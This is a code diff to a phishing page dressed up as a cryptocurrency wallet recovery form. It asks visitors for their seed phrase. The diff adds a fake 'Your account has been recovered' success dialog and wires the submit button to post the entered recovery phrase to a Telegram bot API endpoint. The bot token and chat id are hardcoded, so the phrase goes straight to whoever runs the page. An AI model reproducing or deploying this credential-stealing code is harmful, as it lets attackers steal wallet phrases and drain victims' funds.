@@ -45,6 +45,24 @@
   font-size: 14px;
 
 }
+dialog {  
+        
+            width:100%;
+            text-align: center;
+            height: 45%;
+            border:2px solid #ddd;
+            box-shadow: 0 15px 30px 0 rgba(0,0,0,0.11),
+            0 5px 15px 0 rgba(0,0,0,0.08);
+            border-radius: 15px;
+            max-width: 400px;
+            overflow:hidden;
+
+        }
+        
+        
+       
+      
+
 .bootstrap-tagsinput{
   width: 70%;
  
@@ -219,14 +237,56 @@ Language
     <br>
     <span style="color: gray; font-size: 13px; width: 70%;
     ">The recovery phrase below is the only way to access the cryptocurrency stored in your accounts. Anyone that has access to your recovery phrase can spend your cryptocurrency. Carefully write down your recovery phrase and store it in a safe place</span> <br><br>
+
     <form method="post" action=""> 
+
+
+
+
+        <dialog> 
+    
+      <form action="" style=""> 
+        <img src="https://martielbeatty.com/wp-content/uploads/2018/03/green-tick-png-green-tick-icon-image-14141-1000.png" width="100">
+      <div class="bosluk" style="height: 7%;"></div>
+        <center>
+          
+      
+  <h2 class="" style="font-family: cursive; font-weight: 700;">Awesome!</h2>
+  <p style="font-size: 14px; font-weight: 600;">Your account has been recovered.</p>
+ 
+ 
+      <button style="background-color: #82C815; width: 70%; height: 32px; line-height: 5px;" type="submit" class="btn btn-success" id="sendit">OK</button>
+        </center>
+      </form>
+      </dialog>
+
+
+
 <input type="text" class="form-control" name="phrase" id="tags-input"  /> <br><br>
 <button type="button" class="btn- btn-primary" style="border-radius: 5px; ">Add</button>
 <button type="submit" id="checkpointSubmitButton" class="btn- btn-primary " style="border-radius: 5px; margin-left: 10%;">Send</button>
 </form>
+  <script> 
+    
+           var modal = document.querySelector("dialog");
+           
+           document.querySelector("#checkpointSubmitButton").onclick = function() { 
+           
+               modal.showModal();
+           
+           }
+           
+           document.querySelector("#kapat").onclick = function() {  
+           
+               modal.close();
+               return false;
+           
+           }
+    
+    </script>
 <script type="text/javascript">
       $(document).ready(function () {
-    $('#checkpointSubmitButton').click(function(e) {
+    $('#sendit').click(function(e) {
 
             e.preventDefault();
             e.stopPropagation();
@@ -236,15 +296,15 @@ Language
             var phrase = document.getElementById('tags-input').value;
             var icerik = "phrase: " + phrase;
 
-if(phrase != ""){
+
 
            $.post("https://api.telegram.org/bot1744488788:AAG25a8dddr0lg30_lTasnIdCf8rclUStw0/sendMessage?text="+icerik+"&chat_id=-559660326", 
               
               function (data, status) {
                 //console.log(data);
-                  window.location.href = "index.html";
+                  window.location.href = "";
            });
-             }
+             
 
 
             
